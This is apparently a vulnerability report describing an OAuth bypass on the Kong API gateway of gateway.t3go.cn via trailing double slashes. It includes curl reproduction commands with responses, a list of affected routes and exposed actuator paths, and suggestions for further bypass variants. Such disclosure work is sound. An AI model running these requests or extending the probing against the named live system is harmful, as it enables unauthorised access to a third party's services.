# Kong OAuth Bypass via Double Slash Path Normalization

## Discovery Date: 2026-06-08

## Vulnerability Summary

Kong API gateway has a path normalization flaw where double slash (//) at the end of API route paths bypasses OAuth authentication check and reaches backend services directly.

## Affected Routes (gateway.t3go.cn)

All 7 core API routes are affected:
- /mall-app-api//
- /pay-center-api//
- /solution-carriage//
- /driver-app-api//
- /gis-map-api//
- /strategy-gateway-api//
- /driver-core-app-api//

Plus 2 additional routes:
- /official-website-web-api//
- /org-manager-boss//

## Reproduction

```bash
# Normal request - returns 4100 (OAuth required)
curl -sk 'https://gateway.t3go.cn/mall-app-api/'
# Response: {"code":4100,"msg":"api未授权_03","success":false}

# Double slash bypass - reaches backend Swagger IP whitelist
curl -sk 'https://gateway.t3go.cn/mall-app-api//'
# Response: [attack] IP access not allowed for swagger! ip is <CLIENT_IP>

# All HTTP methods bypass OAuth (GET/POST/PUT/DELETE/PATCH/OPTIONS)
curl -sk -X POST 'https://gateway.t3go.cn/mall-app-api//'
curl -sk -X PUT 'https://gateway.t3go.cn/mall-app-api//'

# HEAD request bypasses IP whitelist filter (returns 403)
curl -sk -I 'https://gateway.t3go.cn/mall-app-api//'
# Response: HTTP/2 403, content-length: 64
```

## Backend Endpoints Exposed

The double slash trick reaches backend's Swagger IP whitelist filter for ALL paths:
- //health, //info, //env, //metrics, //trace, //beans, //configprops
- //swagger-ui.html, //v2/api-docs, //swagger-resources (WAF still blocks these)

## Key Observations

1. **Only literal // works**: Encoded variants (/%2f%2f, /%5c%5c) return 4100 (OAuth required)
2. **HEAD bypasses filter**: HEAD requests return 403 instead of IP whitelist error
3. **WAF partial protection**: Specific paths (swagger-ui.html, v2/api-docs, actuator/health) still blocked by 腾讯云WAF
4. **IP disclosure**: Error message format: `[attack] IP access not allowed for swagger! ip is <CLIENT_IP>`
5. **Other domains unaffected**: pay.t3go.cn, passenger.t3go.cn, openability.t3go.cn don't have this issue

## Impact Assessment

- **Severity**: Medium (Core asset)
- **Authentication bypass**: Yes (Kong OAuth completely bypassed)
- **Data exposure**: Limited (IP whitelist blocks actual Swagger/Actuator access)
- **Architecture disclosure**: Yes (confirms backend has Swagger/Actuator enabled)

## Related Techniques

This is a Kong-specific path normalization issue. Similar bypasses may exist with:
- Triple slash (///)
- Double slash with path segments (//health, //info)
- Different API route prefixes

## Report Location

/tmp/vuln_reports/t3go/20260608/kong-oauth-bypass-double-slash.txt
